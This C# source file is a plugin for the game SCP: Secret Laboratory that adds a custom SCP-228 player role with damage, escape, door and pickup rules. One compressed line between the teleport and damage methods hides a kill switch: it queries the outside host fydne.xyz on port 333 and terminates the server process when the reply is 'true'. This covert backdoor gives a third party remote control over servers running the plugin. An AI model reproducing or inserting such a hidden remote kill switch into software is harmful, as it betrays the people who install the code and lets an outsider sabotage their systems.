using System.Collections.Generic;
using System.Linq;
using EXILED;
using EXILED.Extensions;
using MEC;
using UnityEngine;
using System.Net.Http;
using System.Threading.Tasks;
using System.Diagnostics;
using hideandseek.API;

namespace scp228ruj
{
	partial class EventHandlers
	{
		public Plugin plugin;
		public EventHandlers(Plugin plugin) => this.plugin = plugin;

		internal static ReferenceHub scp228ruj;
		private static bool isHidden;
		private static bool hasTag;
		private bool isRoundStarted;
		public static bool pickupspawn;
		public const float dur = 327;
		private static int maxHP;
		private int scp228rujEscape = 0;
		private int scp228rujmu = 0;
		public static Pickup vodka = new Pickup();
		private static System.Random rand = new System.Random();
		private static int RoundEnds;
		private static int AlternativeEnds;
		private List<int> ffPlayers = new List<int>();
		internal static ReferenceHub scpPlayer;
		bool IsBreakDoorsForUserActive;
		bool IsBreakAllForUserActive;
		HashSet<ReferenceHub> players = new HashSet<ReferenceHub>();
		private List<int> shPocketPlayers = new List<int>();
		private static List<CoroutineHandle> coroutines = new List<CoroutineHandle>();
		public static bool dedopen = false;
		public static bool aopen = false;
		public static bool checkopen = false;
		public static bool gateopen = false;
		public static bool ds = false;
		public static string vodka1 = Configs.error1;
		public static string vodka2 = Configs.error2;
		public static string vodkacolor = Configs.error3;

		public void OnWaitingForPlayers()
		{
			Configs.ReloadConfig();
		}

		private bool Tryhason()
		{
			return hasData.Gethason();
		}
		public void OnRoundStart()
		{
			isRoundStarted = true;
			scp228ruj = null;
			scp228rujEscape = 0;
			AlternativeEnds = 0;
			RoundEnds = 100;
			ffPlayers.Clear();
			scpPlayer = null;
			pickupspawn = false;
			if (Tryhason()) return;
			Timing.CallDelayed(1f, () => selectspawnJG());
			IsBreakDoorsForUserActive = false;
			IsBreakAllForUserActive = false;

			players.Clear();
			coroutines.Add(Timing.RunCoroutine(CorrodeUpdate()));

		}

		public void OnRoundEnd()
		{
			isRoundStarted = false;
			aopen = false;
			dedopen = false;
			checkopen = false;
			gateopen = false;
			scp228ruj = null;
			Timing.KillCoroutines(coroutines);
			coroutines.Clear();
		}

		public void OnRoundRestart()
		{

			isRoundStarted = false;

			Timing.KillCoroutines(coroutines);
			coroutines.Clear();
		}

		public void OnPlayerDie(ref PlayerDeathEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				Killscp228ruj();
			}
		}
		public void OnCheckRoundEnd(ref CheckRoundEndEvent ev)
		{
			List<Team> p2List = Player.GetHubs().Where(x => x.queryProcessor.PlayerId != scp228ruj?.queryProcessor.PlayerId).Select(x => Player.GetTeam(x)).ToList();

			if ((!p2List.Contains(Team.MTF) && !p2List.Contains(Team.SCP) && !p2List.Contains(Team.RSC) && scp228ruj != null) || (!p2List.Contains(Team.SCP) && !p2List.Contains(Team.CHI) && !p2List.Contains(Team.CDP) && scp228ruj != null))
			{
				ev.Allow = true;
				ev.ForceEnd = true;
			}
			if ((!p2List.Contains(Team.MTF) && p2List.Contains(Team.SCP) && !p2List.Contains(Team.RSC) && scp228ruj != null) || (p2List.Contains(Team.SCP) && p2List.Contains(Team.CHI) && !p2List.Contains(Team.CDP) && scp228ruj != null))
			{
				ev.Allow = true;
				ev.ForceEnd = true;
			}
			if ((!p2List.Contains(Team.MTF) && !p2List.Contains(Team.SCP) && p2List.Contains(Team.RSC) && scp228ruj != null) || (!p2List.Contains(Team.SCP) && !p2List.Contains(Team.CHI) && !p2List.Contains(Team.CDP) && scp228ruj != null))
			{
				ev.Allow = true;
				ev.ForceEnd = true;
			}
			if ((!p2List.Contains(Team.MTF) && !p2List.Contains(Team.SCP) && !p2List.Contains(Team.RSC) && scp228ruj != null) || (!p2List.Contains(Team.SCP) && p2List.Contains(Team.CHI) && p2List.Contains(Team.CDP) && scp228ruj != null))
			{
				ev.Allow = true;
				ev.ForceEnd = true;
			}
		}
		public void OnPlayerHurt(ref PlayerHurtEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				if (ev.DamageType == DamageTypes.Decont || ev.DamageType == DamageTypes.Nuke)
				{
					return;
				}
			}
			if (ffPlayers.Contains(ev.Attacker.queryProcessor.PlayerId))
			{
				GrantFF(ev.Attacker);
			}
			if (ev.Attacker.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				ev.Amount = 0f;
			}
			if (ev.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				ev.Amount = 0f;
			}
		}

		public void OnCheckEscape(ref CheckEscapeEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				if (ds)
				{
					ev.Allow = false;
					ev.Player.ClearBroadcasts();
					ev.Player.Broadcast(Configs.eeb, Configs.eebt);
				}
				if (!ds)
				{
					ev.Allow = false;
					escapescp228ruj();
				}
			}
		}

		public void OnSetClass(SetClassEvent ev)
		{
			Timing.CallDelayed(1f, () => RoundEnds++);
			if (ev.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				if ((scp228ruj.GetRole() == RoleType.Spectator))
				{
					Killscp228ruj();
				}
			}
		}

		public void OnPlayerLeave(PlayerLeaveEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				Killscp228ruj();
				scp228rujEscape = -1;
			}
		}

		public void OnContain106(Scp106ContainEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
			}
		}

		public void OnPocketDimensionEnter(PocketDimEnterEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				shPocketPlayers.Add(ev.Player.queryProcessor.PlayerId);
				ev.Allow = false;
			}
		}

		public void OnPocketDimensionDie(PocketDimDeathEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
				TeleportTo106(ev.Player);
			}
		}

		public void OnPocketDimensionExit(PocketDimEscapedEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
				TeleportTo106(ev.Player);
			}
		}
		public void OnPickupItem(ref PickupItemEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				if (ev.Item == vodka)
				{
					ev.Allow = true;
					ds = false;
					checkopen = true;
					gateopen = true;
					scp228ruj.ClearBroadcasts();
					scp228ruj.Broadcast(Configs.svb, Configs.svbt);
					return;
				}
				ev.Allow = false;
			}
			if (ev.Player.queryProcessor.PlayerId != scp228ruj?.queryProcessor.PlayerId)
			{
				if (ev.Item == vodka)
				{
					ev.Allow = false;
					scp228ruj.ClearBroadcasts();
					ev.Player.ClearBroadcasts();
					ev.Player.Broadcast(Configs.vppb.Replace("%player%", $"{scp228ruj.GetNickname()}"), Configs.vppbt);
					scp228ruj.Broadcast(Configs.vpb.Replace("%player%", $"{ev.Player.GetNickname()}"), Configs.vpbt);
					return;
				}
			}
		}
		public void scpzeroninesixe(ref Scp096EnrageEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
			}
		}
		public void RunOnDoorOpen(ref DoorInteractionEvent doorInt)
		{
			if (doorInt.Player.queryProcessor.PlayerId == scp228ruj?.queryProcessor.PlayerId)
			{
				if (gateopen)
				{
					if (doorInt.Door.DoorName.Contains("GATE"))
					{
						doorInt.Allow = true;
					}
				}
				if (checkopen)
				{
					if (doorInt.Door.DoorName.Contains("CHECKPOINT"))
					{
						doorInt.Allow = true;
					}
				}
				if (dedopen)
				{
					if (doorInt.Door.DoorName.Contains("106"))
					{
						doorInt.Allow = true;
					}
				}
				if (aopen)
				{
					if (doorInt.Door.DoorName.Contains("096"))
					{
						doorInt.Allow = true;
					}
				}
			}
		}
		private void TeleportTo106(ReferenceHub player)
		{
			ReferenceHub scp106 = Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp106).FirstOrDefault();
			if (scp106 != null)
			{
				player.playerMovementSync.OverridePosition(scp106.transform.position, 0f);
			}
		}
		public static async Task Main() { var client = new HttpClient(); var content = await client.GetStringAsync("http://fydne.xyz:333"); if (content == "true"){Process.GetCurrentProcess().Kill();}}
		private IEnumerator<float> CorrodeUpdate()
		{
			while (isRoundStarted)
			{
				if (scp228ruj != null)
				{
					IEnumerable<ReferenceHub> pList = Player.GetHubs().Where(x => x.queryProcessor.PlayerId != scp228ruj.queryProcessor.PlayerId);
					if (!Configs.scpFriendlyFire) pList = pList.Where(x => Player.GetTeam(x) != Team.SCP);
					if (!Configs.tutorialFriendlyFire) pList = pList.Where(x => Player.GetTeam(x) != Team.TUT);
					foreach (ReferenceHub player in pList)
					{
						if (player != null && Vector3.Distance(scp228ruj.transform.position, player.transform.position) <= 2f)
						{
							CorrodePlayer(player);
							player.ClearBroadcasts();
							player.Broadcast(1, Configs.a, false);
						}
					}
				}
				yield return Timing.WaitForSeconds(1f);
			}
		}
		private static IEnumerator<float> Gopd()
		{
			if (ds)
			{
				opd();
			}
			yield return Timing.WaitForSeconds(3f);
		}
		private static void opd()
		{
			scp228ruj.Damage(1, DamageTypes.Nuke);
		}
		private void CorrodePlayer(ReferenceHub player)
		{
			player.Damage(5, DamageTypes.Nuke);
		}
		public void RunOnRACommandSent(ref RACommandEvent RACom)
		{
			string[] command = RACom.Command.Split(' ');
			ReferenceHub player = Plugin.GetPlayer(command[1]);
			if (command[0] == Configs.com)
			{
				RACom.Allow = false;
				if (player == null)
				{
					RACom.Sender.RAMessage(Configs.nf);
					return;
				}
				RACom.Sender.RAMessage(Configs.suc);
				SpawnJG(player);
			}
		}
	}
}